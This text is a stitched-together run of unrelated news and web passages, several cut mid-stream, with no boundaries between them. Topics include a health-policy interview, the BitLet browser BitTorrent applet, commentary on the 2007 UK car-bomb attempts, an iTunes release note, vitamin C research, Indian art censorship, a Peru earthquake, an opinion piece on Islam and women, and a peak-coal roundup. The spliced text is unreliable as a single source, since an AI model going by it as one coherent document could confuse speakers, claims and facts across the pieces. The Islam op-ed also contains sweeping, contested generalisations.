Then if you go into competition with a hospital , may the force be with you , because they 're going to run to Congress and they 're going to say , " We 're so charitable and wonderful , and this venal competitor 's taking away our best business . "
And we 've seen how sympathetic Congress is in mashing down entrepreneurs by saying , " Oh , you 're such a wonderful charity , how can we permit anybody to compete with you ? "
Q : Are n't improved techniques for minimally invasive surgery an innovation ?
It gets you out of your bed quicker , gets you back to work quicker , fewer costs , more productivity .
A : Do you know how that came to be ?
It came through the community hospitals .
The big academic medical centers did n't want minimally invasive surgery because it threatened the surgeons and it threatened the hospitals ; their real profit centers are the surgical suites .
It came through community hospitals and community doctors who communed with their patients , and the patient said , " I have to get back to work , I make $ 50,000 a year , I can't spend 6 months in recovery . "
That 's how it came about and then it moved up the food chain to the big academic medical centers .
Q : You have generated and advocated for many years this concept of consumer - driven or market - driven health care .
What is the idea ?
A : It basically is giving us back the money we now hand over to our employers for health insurance , so we can buy our own .
And if we 're poor , the government will transfer money to us so that we can go and buy it for ourselves .
But there is no individual insurance market right now .
How do you solve this problem ?
Well , one idea is the one ( former Massachusetts Governor Mitt ) Romney put together , which is called the Connector .
It offers individuals a tax - sheltered market for different insurance products .
I 'm not crazy about that solution , because one market means no competition , and the products on that market are designed by the government , which is not exactly my idea of how products ought to be designed .
I think what 's going to happen is once we have an individual mandate to have health insurance , and you and I get back the money that somebody used to spend on our behalf , there 'll be a lot of entrepreneurs who'll create these markets .
The analogy is in the mutual fund market .
Vanguard came along with the 401 ( k ) , and John Bogle , the amazing man who created Vanguard , knew that consumers were going to have to shop for retirement income choices , and what the hell would they buy ?
There were a lot of stinky products around .
He created Vanguard and he created terrific products , these indexed mutual funds .
Lots of employers picked up Vanguard , or Fidelity , or T. Rowe Price , and they said , " We 're not doing the investing for you anymore .
We 're giving you the money , and we 're giving it in tax - sheltered ways so you can use your own money , and we 're also giving you a great supermarket that has very good products in it . "
So I think that will happen .
There 's always a tipping point , and we 've hit the tipping point here .
The other part that the government must do is to require transparency , to require the quality metrics that we need in order to be good shoppers .
If I had stage four breast cancer and were going in a hospital , I need to know how good that hospital is for women like me who are having a lumpectomy .
The only way , in my view , that we 're going to get there — this is a classic public good — is for the government to require this kind of disclosure , and to have something like generally accepted accounting principles and audits so it goes beyond " trust us . "
I think that 's what we need , and I honestly believe that we will have it by the end of the term of the next President .
We 'll have the mechanism that will bring transparency and have this tax support that will make it possible for people to buy health insurance with pre-tax money .
Q : And why are the 5 forces that are killing health care going to roll over in the next 6 or more years ?
A : No , they 're not going to roll over .
They 're going to kick and scream .
But I think the tipping point , the fact that Michael Moore and I — who could be stranger bedmates ?— have reached the same point is an indication of how pervasive the recognition of this problem is , the economic problem and , more importantly , the human problem , the lack of quality and the lack of assets .
Q : It seems a hard case to make .
As you described , in the current system the consumer has no power , no leverage , basically .
A : The reason I 'm sanguine about it is managed care went from zero penetration to 100 percent penetration in 4 years , and we were n't as badly off at that time .
So , elephantine though this economy is , we can transform ourselves with astonishing rapidity if we permit the transformative forces to work , if we unleash consumers , unleash entrepreneurs , do n't keep binding them up .
It will happen very fast .
Also the insurers stand to win in this in some ways , because with universal coverage the market gets much bigger .
The hospitals are going to be huge losers , because once consumers buy health insurance , they will want cheaper health insurance policies .
The only way to get them cheaper is to cheapen down the health care delivery system , and the most bloated part of it is the hospital , and these health care delivery entrepreneurs will start popping up .
And I expect tremendous resistance to transparency .
Nobody wants to be measured .
The argument will be , " It 's not feasible . "
So , we can unravel the genetic code , we can measure tau neutrinos , but nope , the quality of this doctor or hospital is unmeasurable ?
I think these are very self - serving arguments .
Q : Well , you almost automatically get transparency if you have the money in the hands of the consumers , because they 're going to demand to know what they 're buying .
A : Absolutely .
The critical lever is getting the money to the consumers .
That transforms the whole , causes transparency , also changes the delivery system .
It lets consumers ask , " Why does it cost $ 100,000 to have surgery in the U.S. but it costs $ 7,000 with American - trained doctors in India ? "
Help me understand this .
In the summer of 2007 , shortly after launching Novlet , Daniele and I still had time to spare and were looking for something new to build .
Sure enough , within a short period , Daniele came up with the idea that would soon become BitLet : a BitTorrent client that could run in a browser without requiring users to install anything on their computer .
Back then , browsers had very limited capabilities : AJAX had been recently introduced ( in 2005 ) , web applications were moving from static pages to dynamic client UIs but no browser could do things like opening sockets and writing files locally , central requirements for a peer to peer file sharing application .
We found a solution in an unlikely piece of technology : Java applets .
Despite Java ’s success as a programming language , applets had never been that popular among casual users .
While a good idea in principle ( small applications that could be downloaded and launched from web pages ) , the concept never got traction beyond a few niches .
One of the main reasons is that Java applets did n’t look that great .
Given the need to run across multiple platforms ( Windows , Linux , Mac ) , applets used their own window toolkit for rendering interfaces , which led to UIs that always looked quite different from what users were expecting most of the time .
What made BitLet possible , however , was the idea that we could have the applet implement the BitTorrent protocol while relying only on the browser for its interface .
The interface we had in mind was very simple , centered around a streamlined download window .
We had a first version shortly after , an applet with no Java UI that would use JavaScript to communicate with the hosting browser to handle events and drive page updates .
We built a very simple website around it and published it .
Within days , BitLet took off .
People loved the simplicity and the ability to use BitTorrent anywhere , without needing to install any client software .
One of the very first articles featuring BitLet stated :
Very useful if you want to share a torrent with your BitTorrent illiterate friends , or if you ’re on a computer that does n’t have a BitTorrent client installed . [… ]
I ’ve tried it with a couple of torrents and it seems to be working quite well , just enter the url of the .torrent file and you ’re good to go .
The download speeds are decent and does n’t require any configuration , so it ’s pretty much idiot - proof .
As user took notice , a few prominent file sharing sites did too , and embedded links to BitLet on their download pages .
We kept adding features , introduced the option to stream music and video as they were being downloaded , added UPnP support to open ports on home routers for faster transfer speeds , wrote a Chrome extension to make BitLet the default download option for torrents .
We had a great time working on this , it ’s been a great side project that was also very interesting technically .
Years later , applets became less and less popular , with several browsers dropping support for the Java plugin that allowed running applets , which led Sun to officially deprecate the technology in 2016 .
That signaled the end of an era for us : BitLet was considerably harder to use for people and the initial value of simplicity we built the applet around disappeared .
We turned off bitlet.org in 2016 and open sourced parts of the infrastructure :
Analysis
The " car bomber " hysteria gripping much of the British and international media over the weekend has had a bucket of cold water from the Reg already , but just one bucket does n't seem enough for this kind of outbreak .
To recap : an exceptionally incompetent group of troublemakers , unknown to the plods or spooks , decided to bring a spot of terror to old Blighty starting last Friday .
These people had no actual explosives , and were apparently too lazy and ignorant to learn how to make them .
Instead , they decided to load cars with petrol , domestic gas cylinders and " containers holding nails " , and then set fire to them - either manually or using a cellphone - initiated remote rig of some kind .
Some selected headlines :
" Police avert car bomb ' carnage ' " - BBC
" London on the Edge " - Belfast Telegraph
" Terror in Theatreland " - Daily Record
Normally reputable news sources used phrases like " explosives - packed cars " , " Qaeda Tactics " and " a third attempt to create terror mayhem in Britain in under 36 hours .
Only luck saved lives " .
This is n't just rightwing hacks pumping up fear so that the evil securocrats can steal money from hospitals , aid , road safety etc , as our own Thomas C Greene has suggested ( As an aside , for UK readers , the health - service budget alone is around three times that of the Defence ministry - and the Defence budget is the big fish in the UK securocrat pond ) .
Regrettably , alongside the usual mongers of terror fear , more liberal journos have also sought to exaggerate the significance of these rather pathetic attacks .
In the case of the lefties , the idea is to suggest that had we Brits not mounted recent wars in Southwest Asia , we would be spared this kind of devastating " terror mayhem . "
Frankly , if this kind of thing is the only backlash the West experiences for Iraq , we 've got off pretty much scot - free : we should indulge in a spot of military adventurism any time we feel like it .
Conversely , if this is all al - Qaeda have to offer , we should never have lost a moment 's sleep over them - let alone shoved our valuable appendages into the military meat - grinder of Afghanistan ( I 'm choosing to assume here that al - Qaeda only became a serious presence in Iraq after we invaded the place .
Argue among yourselves as to whether Saddam was more or less threatening than Osama ) .
Getting back to here and now , these have to be some of the most pathetic terror attacks ever - difficult to distinguish from minor accidents .
For goodness ' sake , a car is full of petrol anyway ; and gas cylinders too often enough .
People drive cylinders of gas around all the time .
Now and again - oh my god !
- they probably carry boxes of nails , bolts , tools or whatever in the same vehicle .
( Aiee ! )
Sometimes these fiends crash their cars , and sometimes the vehicles burn out .
It 's one of the costs of living in the industrial world ; if people could n't get fuel - portable energy - easily enough to have accidents with it , most of us would still be dirt - poor , illiterate , shovelling muck for a living and dying like flies from disease - rather than dying very rarely in car crashes or gas explosions .
This kind of event happens on the motorways almost every day , at least the petrol fires and often enough with the other hazards added .
The roads get closed off as a result , sometimes for hours - just like the Haymarket did on Friday morning .
It causes massive inconvenience to lots and lots of people .
But the perimeter is manned by firemen and traffic cops , not bomb teams and terror - feds .
And so this weekend a minor news story - one injured in bunt - out car / suicide attempt causes travel chaos - becomes a big international media frenzy , a " test of the new Prime Minister 's mettle , " if you please .
It might be a test of ministerial mettle if thousands of British Muslims were burning cars every night , as has happened in France .
But what we seem to have here is some foreigners burning just one car and failing to burn two more owing to almost unbelievable incompetence .
The mindset of a man who 's willing to set himself on fire to make a point - as one of the Glasgow terror - clowns seems to have done - but not to spend any effort at all on researching methods is a difficult one to understand .
Even if these jokers were illiterate or had no internet access ( seems unlikely , one of the suspects is apparently a doctor ) they could have at least done a test .
In my part of town , fun -loving teenagers burn out a car or two down by the canal every week or so : nobody would notice another one with some nails in it .
It looks like those legions of iPod owners who have been taking Apple 's advice to hold off on upgrading to Vista can finally dust off their month - old DVD cases and get their upgrade on , as iTunes 7.1 has officially been released with " a number " of the compatibility issues accounted for .
According to the release notes , however , a few known problems still remain , with the most serious being the nasty possibility that your iPod gets corrupted when you go by the book and select " Safely Remove Hardware " from the taskbar to , um , safely remove your hardware .
Instead , users are advised to choose " Eject iPod " from the iTunes Control menu or " Restore " if they 're reading this just a little too late .
Other remaining quirks include sporadic address book syncs , messed up text and graphics ( resizing the window should do the trick ) , and annoyingly , continued lack of support for any 64 - bit editions of Windows , be it XP or Vista .
Meanwhile , in other news , the ten Zune owners who also rock a Mac are still waiting patiently for Microsoft to acknowledge their existence .

Use your body 's natural rhythms -- and a few tips from the experts -- to find the best time of day to work out , see a doctor , go to the post office , and more .
Best time of day to clean the house -- 4 p.m .
You 're more likely to whistle while you window wash ( and not kick over the bucket ) if you do it in the late afternoon .
That 's when hand - eye coordination is at its peak and mood levels are high , says Michael Smolensky , a professor of environmental physiology at the University of Texas School of Public Health at Houston and author of " The Body Clock Guide to Better Health . "
If anyone in the house has allergies or asthma , avoid insomnia - hour and morning cleaning sprees ( nasal - allergy symptoms are most severe between 6 a.m. and noon , asthma attacks more likely between midnight and 6 a.m. ) , and finish well before that person walks in the door .
" It takes about an hour for allergens and dust to settle after you clean , " says Martha White , M.D. , director of research at the Institute for Asthma and Allergy , in Wheaton , Maryland .
Best time of day to take a nap -- 1 p.m. to 2:30 p.m .
Doctors used to think afternoon sleepiness was the result of a big lunch .
" But we 've found that in the early afternoon there 's a dip in body temperature , which causes sleepiness , " says Smolensky .
Just as a similar decrease encourages you to shut down at bedtime , this midday dip can make you crave a siesta .
An ideal nap , he says , should last 15 to 20 minutes .
More than 30 and you may end up with sleep inertia -- and feel even more groggy when the nap 's over .
Richard Schwab , M.D. , codirector of the University of Pennsylvania Penn Sleep Center , in Philadelphia , says that early afternoon is indeed when your circadian rhythms ( the pattern of physical and mental changes we each repeat every 24 hours ) are " more likely to want your body to sleep . "
But Schwab insists that if we were n't all so sleep - deprived , we would n't need naps in the first place .
Best time of day to go to the doctor -- 8 a.m. to 9 a.m. , or 1 p.m. to 2 p.m .
You 'll spend less time in the waiting room if you book the first appointment of the morning or the first after lunch , says Patricia Carroll , R.N. , author of " What Nurses Know and Doctors Don't Have Time to Tell You . "
" Doctors start fresh in the morning and catch up when the office is ' closed ' for lunch . "
Many lab tests require fasting , so a morning appointment will help you avoid being hungry half the day .
If you 're seeing a doctor who performs surgery ( orthopedist , gynecologist ) , ask that your appointment not follow her operating time -- a recipe for serious delays , says Carroll .
Pediatricians ' and family - practice offices can get mobbed when work and school let out ( 5 p.m. to 7 p.m. ) .
And if you leave with a prescription to be filled , try to visit the pharmacy before 3 p.m. on weekdays , when it 's least busy -- " which also reduces the risk of error , " says Carroll .

More tips for the best time of day to do anything
Vitamin C , found naturally in citrus fruit , might not help prevent colds
A review of 30 studies , involving 11,350 people , also found doses of at least 200 mg per day did little to reduce the length or severity of colds .
But people exposed to periods of high stress , like marathon runners , could reduce their risk of catching colds by half if they took the vitamin daily .
The Australian and Finnish team 's study is published in the Cochrane Library .
It does n't make sense to take vitamin C 365 days a year to lessen the chance of catching a cold
Professor Harri Hemilä
Researchers at the Australian National University and the University of Helsinki concluded that , for most people , the benefits of taking vitamin C daily were so slight that they were not worth the effort or expense .
Although they found it could reduce the duration of colds by up to 8 % in adults and 13.6 % in children , as most people only have two or three colds every year , this benefit is only very small .
Useful effects
Author Professor Harri Hemilä , said : " It does n't make sense to take vitamin C 365 days a year to lessen the chance of catching a cold . "
However , they say it may be justified in those exposed to severe cold or physical stresses , where vitamin C doses reduced the risk of getting a cold by half .
Furthermore , they say there is " tantalising " evidence from one study that very large doses of vitamin C taken at the beginning of a cold might have a useful effect .
But more research would be needed to evaluate this possibility .
In the 1970s , Nobel Prize - winning chemist Linus Pauling encouraged people to take 1,000 mg of vitamin C daily to ward off colds .
But since then the effects of the vitamin on colds has remained controversial .
Fighting infection
The current recommended daily allowance of vitamin C is just 60mg , and Catherine Collins , a registered dietician with the British Dietetic Association , says an optimum amount would be 200 mg every day .
But she said most people could easily obtain this amount through eating five portions of fruit and vegetables every day .
Furthermore , eating too much vitamin C means it cannot be absorbed and so is removed from the body .
Although infection - fighting white blood cells do use vitamin C , Ms Collins said there was very little evidence to suggest that it could help fight off colds .
She said : " It sounds biologically plausible because vitamin C does help improve our immune systems , but it only seems to work if people are deficient in it in the first place , which is very rare . "
However , she added that the study was useful in adding to the existing body of evidence concerning Vitamin C .
A tyrant must put on the appearance of uncommon devotion to religion .
Subjects are less apprehensive of illegal treatment from a ruler whom they consider god-fearing and pious .
On the other hand , they do less easily move against him , believing that he has the gods on his side .

Chandramohan was released on bail on Monday after five days ’ imprisonment and has gone into hiding .
He could not be reached for comment .
Mr. Jain , whose police complaint set off the art school crisis , said he was proud of his campaign .
He described the student ’s artwork as an attack on Indian culture .
“ I cannot tolerate any insult to our culture and to our god and goddesses , ” he said in a telephone interview .
He said he was also offended by a student painting in which a figure of Jesus was placed before a toilet .
It is not the first time artistic expression in this country has been squelched by state institutions .
In Mumbai , India ’s commercial capital , a court charged M. F. Husain , perhaps India ’s most famous contemporary painter , with obscenity because of a painting he made of a goddess in the nude .
Mr. Husain now lives in self - imposed exile in Dubai .
Because he had not appeared for court hearings , the court recently issued a notice directing that his property in Mumbai be seized .
( The Supreme Court has issued a stay . )
India is rarely lacking for paradox , and one of the most striking is that the puritanism of today ’s Hindu radicals coexists with a long tradition of graphic sexual iconography .
Hindu temple carvings often feature elaborate scenes of copulation .
Among the best - known examples , at Khajuraho , in central India , was invoked this week in newspaper commentaries skewering what was referred to as the moral police brigade .
Writing in the Tuesday issue of The Indian Express , a national daily , Peter Ronald de Souza , a senior fellow at the Center for the Study of Developing Societies , a research organization here , said of the Hindu activists who forced the student ’s arrest :
“ It tells us not just they do not fear the wrath of the law , and that they believe censorship is acceptable in the service of a cause , but also they are certain that their actions would meet with social approval .
So did the Taliban . ”
His commentary was headlined , “ Will They Blow Up Khajuraho ? ”
In a protest on Monday night here in New Delhi , prominent artists , curators and art teachers condemned the attack on the student ’s work as a violation of basic freedom .
“ India is descending into a dark prison of the imagination , ” warned Ram Rahman , a Delhi - based artist who took part .
SEATTLE ( Reuters ) - Lamps , birthday candles , mouse traps and flip - flops .
Such is the stuff that binds the modern American family to the global economy , author Sara Bongiorni discovers during a year of boycotting anything made in China .
The cover of the book " A Year Without ' Made in China , ' " is pictured in this undated photograph .
Lamps , birthday candles , mouse traps and flip - flops .
Such is the stuff that binds the modern American family to the global economy , author Sara Bongiorni discovers during a year of boycotting anything made in China .
REUTERS / Wiley Publishing / Handout
In “ A Year Without ‘ Made in China , ’ ” ( Wiley , $ 24.95 ) Bongiorni tells how she and her family found that such formerly simple acts as finding new shoes , buying a birthday toy and fixing a drawer became ordeals without the Asian giant .
Bongiorni takes pains to say she does not have a protectionist agenda and , despite the occasional worry about the loss of U.S. jobs to overseas factories , she has nothing against China .
Her goal was simply to make Americans aware of how deeply tied they are to the international trading system .
“ I wanted our story to be a friendly , nonjudgmental look at the ways ordinary people are connected to the global economy , ” she said in an interview before the book appears in July .
As a business journalist in Baton Rouge , Louisiana , Bongiorni wrote about international trade for a decade .
“ I used to see the Commerce Department trade statistics , the billions of dollars , and think it had nothing to do with me , ” she said .
The reality was far different .
As the year unfolded , “ the boycott made me rethink the distance between China and me .
In pushing China out of our lives , I got an eye - popping view of how far China had pushed in , ” she wrote .
About 15 percent of the $ 1.7 trillion in goods the United States imported in 2006 came from China , economist Joel Naroff writes in the foreword .
Much of that is the manufactured stuff that fills Wal - Mart and other retailers -- the necessities and frivolities sought by lower - and middle - income Americans .
Lower prices have been one benefit of Beijing ’s rise and make it very hard for consumers to forswear Chinese imports .
LEGOS , LAMPS
And hard it was .
For all of 2005 , minor purchases required dogged detective work as Bongiorni scoured catalogues and read labels .
She repeatedly struck out trying to buy inexpensive shoes for her son , and even the chic local boutique that sold fancy European labels had gone out of business .
So she shelled out $ 68 for Italian sneakers from a catalogue .
Broken appliances gathered dust because the spare parts came from China .
And , with the Asian country having a near lock on the toy aisles , her 4 - year - old son grew tired of taking Danish - made Legos to birthday parties as gifts .
The family resorted to snapping mouse traps when the gentler catch and release kind came from , you guessed it , China .
Bongiorni got a lesson in the global economy after products advertised as Made in USA turned out to have Chinese parts .
She decided to keep a lamp with just this problem after speaking to the manufacturer and learning how China is “ eating the lunch ” of the few U.S lamp producers left .
Since the boycott ’s end , Bongiorni has chosen a middle ground .
Her family seeks alternatives but accepts Chinese products when most practical .
But one habit from the boycott remains :
It required her to think hard about what she buys .
“ Shopping became meaningful , ” she said .
Employers could have grounds to demand ownership of employees ' social networking profiles , such as those generated on Facebook , MySpace or Bebo , according to a leading intellectual property lawyer .
The news comes in the wake of a court ruling which forced a journalist to hand over the contents of his contacts list to his former employer after he left that company .
Employers could insist on gaining ownership of some social networking content , though only in limited circumstances , according to IP law expert Catrin Turner of Pinsent Masons , the law firm behind OUT - LAW .
COM .
" If a social networking site is used to hold any information which relates to your employment , if that information is prepared in the course of your employment you are dealing with company property , " said Turner .
The profile , or the elements of it that are work related , would belong to the employer despite the fact that it was created and is hosted in a virtual environment primarily designed for personal interaction .
" If [ the employer ] can argue that you have created something and it's in the course of your employment , it 's irrelevant where it 's stored because the law does n't look at where it 's stored , the law looks at the circumstances in which it was created , " she said .
" If you create a contact list or any sort of document during working hours using your work PC that relates in some way to your job or is of value to your employer they would have a very strong argument that that belongs to them . "
The case of Junior Isles and conference and publishing business PennWell Publishing has highlighted the fact that employers can own an employee 's digital creations and that that ownership can extend further than some workers may realise .
Isles brought a list of journalistic contacts to his job at PennWell and added to it while working there .
When he left to set up a rival company PennWell objected to his taking the contacts list with him .
Isles claimed that the contacts list was his personal information and that only 20 per cent of it was added while he worked for PennWell .
He also said that it would breach his human rights to take it from him and deprive him of his right to free journalistic expression .
The Court ruled that the list belonged to PennWell .
It said that if he had maintained a separate list of contacts for personal purposes and added selectively to it , he could have kept that .
It also said that he could have taken his personal contacts and any that he brought to the firm in the first place with him .
Because Isles had tried to take the whole list , PennWell was allowed to keep the database of contacts and was also granted an injunction preventing Isles from using the database .
The company did allow Isles to keep and use the contacts he had brought to the firm , though .
The ruling confirmed the right of an employer to treat as its own property the creations of its employees if they were made in the course of business .
That includes digital creations , even if some of that creation is for personal purposes .
Turner said that though a company 's internet and email usage policies were important , it was not necessary to state the potential claim in them because the basis of that claim was fixed in the law .
" The basic law is that if you create copyright material , something you write or type into a computer , you take photographs , you do cartoons , you potentially create film , if that is created in the course of your employment then the assumption is that that belongs to your employer , so that does n't have to be written down by your employer , " she said .
Turner said that social networking sites and the material a person creates for them do not exist in a vacuum , that they do interact with working life , but that most users do not realise this .
" They may think that social networking is something which does n't affect their work relationship , but it certainly does , " she said .

A magnitude 7.9 earthquake struck off the coast of central Peru on Wednesday evening , killing 15 people and leaving 70 hurt , President Alan Garcia said on national television .
Pedestrians try to make calls on their cell phones in Lima , Peru , after a strong earthquake Wednesday .
Peru's Panamericana TV put the death toll at 17 .
It showed footage of traffic lights in the capital , Lima , swaying with the quake .
After everything stopped shaking , medics were seen tending to a woman .
The video also showed chunks of plaster that had fallen from buildings .
Some Lima residents were sobbing after the temblor , while others appeared to be praying .
" This has been the most terrifying experience we 've had , " Gladys Tarnawiecki told CNN from her home in Lima .
" It was extremely long ... never in my life had I experienced this long an earthquake , " she said .
See the Lima resident describe how people were ' shouting and praying ' »
Many people were outside in the streets , she said , as the radio warned them that aftershocks could follow the quake .
Tarnawiecki said she was waiting in her car , afraid to go back inside .
" It was chaos , " said Fernando Calderon , an American visiting Peru .
" Everybody started crying -- kids , everybody .
Everybody started running toward any empty space .
Everybody was afraid the buildings were going to collapse . "
" It 's an awful experience , because there 's no warning , " he said .
The quake shook inland towns , as well as cities near the coast and the mountains .
There were power outages in Lima , Reuters reported , and people ran into the streets in panic as the tremor shook office buildings .
Many stayed outside , afraid to go back indoors after the warnings of possible aftershocks .
Meanwhile , tsunami warnings and watches issued after the quake for several Central and South American countries were canceled Wednesday night , as was a tsunami advisory for Hawaii .
Peru , and most of the South American Pacific Coast , are on border of two tectonic plates :
The South American plate , which includes most of the continent , and the Nazca plate , which extends across the Pacific along most of the coast .

The quake was felt for two minutes , according to Peruvian media .
Broken windows were reported in Lima , and mobile phone service was interrupted .
The coastal town of Pisco , about 160 miles ( 257 kilometers ) south of Lima , appears to be the hardest - hit , and electricity was out in the town , Gen .
Luis Palomino , head of Peru 's national civil defense institute , told CNN International .
He said he could not confirm any deaths .
The quake struck at 6:41 p.m. ( 7:41 p.m. ET ) and was centered 25 miles ( 61 kilometers ) west - northwest of Chincha Alta , Peru , and 90 miles ( 161 kilometers ) south - southeast of Lima , according to the U.S. Geological Survey .
The epicenter was 25 miles ( 47 kilometers ) below the Earth 's surface .
More tremors followed .
A magnitude 5.8 quake occurred at 7:02 p.m. ( 8:02 p.m. ET ) .
It was farther inland , centered 70 miles ( 113 kilometers ) northeast of Chincha Alta and 111 miles ( 179 kilometers ) east - southeast of Lima .

" You do n't need a Freud to understand that the core problem with Islam is sex and sexuality , " she said on Tuesday , citing comments from Sheik Taj el - Din al Hilaly .
" By describing women as raw meat and men as wild dogs [ Hilaly revealed ] a world view that is sexually centred . "
As a Dutch MP , Hirsi Ali rose to worldwide prominence in 2004 after the murder of the filmmaker Theo van Gogh by a Muslim extremist outraged by a short film , Submission , which Hirsi Ali helped make .
In it misogynist verses from the Koran were painted on the naked body of a Muslim woman .
Pinned to van Gogh 's chest with a knife was a death threat against Hirsi Ali and she has lived with round - the - clock protection ever since .
When she visited the Centre for Independent Studies on Tuesday she had three state - supplied bodyguards .
Hirsi Ali was the superstar of last week 's Sydney Writers ' Festival , drawing sellout crowds and standing ovations .
But her criticism of Islam as a religion in need of profound reform , and of multiculturalism as another religion which condones Islam 's repressive practices , has made her enemies among the intellectuals of the liberal - left establishment .
They have labelled her a reactionary polemicist in bed with neo-conservative Islamophobes , and expended endless words on whether it is culturally insensitive to criticise a religion that advocates stoning a woman to death for adultery .
She is a refreshing antidote to those who try to politely explain away the barbaric subjugation , enslavement and murder of women around the world in the name of Islam .
" If you improve the conditions for women you would change the religion the fastest , " she says .
But if you accept the idea that women wield the most power in their individual sexual relationships with men , and certainly that they have power over their young sons , then you have to ask how Islamic culture could remain so oppressive towards women without the support of women .
On Tuesday Hirsi Ali skated over the question of why Muslim women are complicit in their own subjugation .
She acknowledged it was her grandmother who secretly had her circumcised against her father 's wishes .
Her father , a Somali opposition politician and " modern man " who adored his spirited oldest child , had " considered the practice barbaric [ and ] had always insisted that his daughters be left uncut " , she writes in Infidel .
" My grandmother was concerned I would not find a husband [ unless circumcised ] .
From her point of view she was doing me a favour , " she said on Tuesday .
" Women think they have to be submissive because that 's what gets you ahead . "
But she also pointed to the phenomenon in some Muslim countries of mothers - in - law instigating honour killings and stoning of their daughters - in - law .
In many cases the subjugated mother exerts her power through her son , and in the Middle East often is defined by him , being known as mother of Mohammed , rather than wife of Osama .
" The boy child is the key to the lock but that all goes away when [ he marries ] , " Ali said .
Marriage " takes away her boy child and all her anger and resentment is then projected onto the bride " .
The Arab - American writer Nonie Darwish has written on the mother - in - law problem and what she calls the " impossible family dynamics of Islam " .
When men are free to marry multiple wives , the result is " strained and hostile relationships among women in the Muslim world … constant fear of envy " .
The channelling of female resentment against other women is but one of the catastrophic consequences of subjugation .
It may also play a role in the reluctance of Muslim migrant families to integrate in the West .
It is perhaps unsurprising that Muslim families would not want to unleash their daughters into a culture in which Paris Hilton is the dominant female archetype and young girls are prematurely sexualised and objectified .
Such women would not be the ideal wives for the precious sons of Muslim mothers .

Ali acknowledged that " 90 per cent " of the complaints she heard from Dutch Muslim families about Western culture were " legitimate .
They worried that Dutch culture would overtake their children with drugs and sex . "
But she concluded that Muslim children were only vulnerable to Western vices because their parents " have n't prepared them " .
This overlooks the fact that non-Muslim families in the West also struggle with the effects of a decaying moral culture .
Hirsi Ali says the West can " win the war of ideas if we persuade as many Muslims as possible [ of the benefits ] of equal opportunities for women and men , gays and heterosexuals " .
This will happen only if Muslim mothers can be persuaded that their sons will not be lost to wanton women .
Thanks to Douglas Low of The Oil Depletion Analysis Centre ( ODAC ) for his assistance compiling this roundup .
Below the fold there is a roundup of the five reports published in the first half of 2007 on the global coal situation .
They are all broadly in agreement saying that there is likely to be less coal available than traditionally thought .
1. Energy Watch Group
A report released by the Energy Watch Group concludes that global coal production will peak about 2025 .
From the report 's executive summary , conclusion and recommendation :
Global coal reserve data are of poor quality , but seem to be biased towards the high side .
Production profile projections suggest the global peak of coal production to occur around 2025 at 30 percent above current production in the best case .
There should be a wide discussion on this subject leading to better data in order to provide a reliable and transparent basis for long term decisions regarding the future structure of our energy system .
Also the repercussions for the climate models on global warming are an important issue .
Some of the report 's conclusions : Data are of poor quality ;
Six countries dominate coal globally USA , Russia , India , China , Australia , South Africa ; Fastest reserve depletion in China , USA beyond peak production .
If the report conclusions are correct , this is good news for climate change and bad news for the global economy .
The implication is that as natural gas supplies get tight over the next two decades , coal will be unable to replace gas for producing electricty .
It also implies that there is no long - term future for producing liquid fuel from coal ( see Fischer - Tropsch , better known as coal - to - liquids ) .

And by Shaun Chamberlin on The Oil Drum : Peak Coal - Coming Soon ?
2. The Future of Coal , a study by B. Kavalov and S. D. Peteves of the Institute for Energy ( IFE ) , prepared for European Commission Joint Research Centre
The report identifies three trends :
Proved reserves are decreasing fast – unlike oil and gas .
Bulk of coal production is concentrated within a few countries .
Coal production cost are rising all over the world .
The following observations are also made :
Hard coal in the EU is largely depleted .
Six countries ( USA , China , India , Russia , South Africa , Australia ) hold 84 % of world hard coal reserves .
Four out of these six ( USA , Russia , China , Australia ) also account for 78 % of world brown coal reserves .
Growth in consumption has not been matched by increasing reserves leading to falling R/P ratios .
Poor investment over the past 10 - 15 years .
The USA and China — former large net exporters — are gradually turning into large net importers with an enormous potential demand , leaving Australia as the “ ultimate global supplier of coal ” .
However all of Australia ’s steam coal exports equal to only 5 % of Chinese steam coal consumption .
The report was discussed by Richard Heinberg : Coal ’s Future in Doubt
Richard Heinberg , Global Public Media [ MuseLetter ] , 09 May 2007 :
The EWG [ Energy Watch Group ] report has enormous implications for climate change , global energy , and particularly for future electricity supply and steel production in the US and China .
Previously , virtually everyone in the fields of energy policy and energy analysis — as well as nearly everyone involved in discussions about climate change — had assumed that the world ’s coal endowment was so enormous that no limits would be encountered anytime this century .
The EWG ’s conclusions turn this assumption on its head ...
Therefore any new analysis of global coal supplies , following on the heels of the EWG report , warrants considerable interest ...
We have not had to wait long .
“ The Future of Coal , ” a study by B. Kavalov and S. D. Peteves of the Institute for Energy ( IFE ) , prepared for European Commission Joint Research Centre , is ready in final draft and will be published within days ...
Early in their paper the authors ask , “ Will coal be a fuel of the future ? ”
Their disturbing conclusion , many pages later , is that “ The analysis in the preceding chapters indicates that coal might not be so abundant , widely available and reliable as an energy source in the future . ”
Along the way , they state “ the world could run out of economically recoverable ( at current economic and operating conditions ) reserves of coal much earlier than widely anticipated . ” ...
In summary , we now have two authoritative studies reaching largely consistent conclusions with devastating implications for the global economy ...
For China and the United States , the world ’s two most coal - dependent countries , the message could not be clearer : whether or not global climate concerns are taken seriously , it is time to fundamentally revise the current energy paradigm .
3. Coal of the Future , a study by B. Kavalov of the Institute for Energy ( IFE ) , prepared for European Commission Joint Research Centre
Similarly titled , B. Kavalov has prepared a second report for the European Commission : Coal of the Future .
This time focussing on the technologies of the coal industry .
The last section of the report covers long term market outlooks where the following observations are made :
China
We calculate that China has 30 years of life in hard coal reserves and it is difficult to see if production can be maintained at over 2 Btpa past 2030 or 2040 , which will focus attention on technological change , including nuclear and use of low quality , expensive - to - mine coal deposits .
Europe
Consistent demand coupled with declining production could produce a potentially significant shortfall in supply and demand profiles by 2015 .
UK will be producing below 10 Mtpa , Germany will produce about 10 Mtpa of hard coal and Poland will at best be meeting its needs but is more likely to be importing coal .
Between 2015 and 2020 , South Africa may well have declined as an exporter to a level below 60 Mtpa .
This would suggest a total deficit of nearly 50 Mt by 2015 , if demand is consistent with today ’s levels , and by 2020 this could be 80 Mt , as South Africa slows its export production .
Post 2020 , we believe South African exports could decline quickly to a level of 40 - 50 Mtpa , which could have a dramatic effect on coal supply if customers do not plan adequately .
Asia
China will decline as an exporter slowly ( some would disagree and believe the country will exit the export market as quickly as they entered it ) and create a shortfall in tonnage .
South Africa , as the swing supplier , will have limited flexibility after 2015 and from 2020 may decline rapidly .
Indonesia will probably see exports decline from 2010 onwards as existing operations come to the end of their lives .
4. Dave Rutledge , California Institute of Technology
